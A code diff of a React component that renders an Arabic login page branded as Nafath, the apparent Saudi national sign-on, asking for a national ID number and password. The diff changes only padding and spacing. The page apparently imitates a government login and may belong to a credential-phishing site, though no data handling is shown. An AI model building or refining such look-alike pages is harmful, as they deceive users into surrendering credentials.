@@ -144,7 +144,7 @@ export default function Nafaz() {
         <p> لا يمكنك الاستمرار في حال عدم قبول المصادقة</p>
       </div>
 
-      <div className="flex-col gap-4 w-full flex items-center justify-center">
+      <div className="flex-col gap-1 w-full flex items-center justify-center">
         <div className="w-20 h-20 border-4 border-transparent text-blue-400 text-4xl animate-spin flex items-center justify-center border-t-blue-400 rounded-full">
           <div className="w-16 h-16 border-4 border-transparent text-red-400 text-2xl animate-spin flex items-center justify-center border-t-red-400 rounded-full"></div>
         </div>
@@ -155,16 +155,16 @@ export default function Nafaz() {
   return (
     <>
       <Header />
-      <div className="min-h-screen bg-[#eee] flex flex-col items-center py-3">
+      <div className="min-h-screen bg-[#eee] flex flex-col items-center py-1">
         <div className="w-full space-y-8">
-          <h1 className="text-4xl font-bold text-[#3a9f8c] mb-6 bg-white p-4">نفاذ</h1>
+          <h1 className="text-4xl font-bold text-[#3a9f8c] mb-6 bg-white p-1">نفاذ</h1>
 
           <h2 className="mt-6 text-3xl text-center font-semibold p-2 border-slate-400 text-[#3a9f8c]">
             الدخول على النظام
           </h2>
           {isRejected && (
             <div
-              className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mx-auto container text-right"
+              className="bg-red-100 border border-red-400 text-red-700 px-4 py-1 rounded relative mx-auto container text-right"
               role="alert"
             >
               <strong className="font-bold">عذراً! </strong>
@@ -183,7 +183,7 @@ export default function Nafaz() {
                       id="identity"
                       type="text"
                       required
-                      className="appearance-none relative block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
+                      className="appearance-none relative block w-full px-1 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
                       value={formData.identity_number}
                       onChange={(e) =>
                         setFormData((prev) => ({
@@ -202,7 +202,7 @@ export default function Nafaz() {
                       id="password"
                       type="password"
                       required
-                      className="appearance-none relative block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
+                      className="appearance-none relative block w-full px-1 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
                       value={formData.password}
                       onChange={(e) =>
                         setFormData((prev) => ({
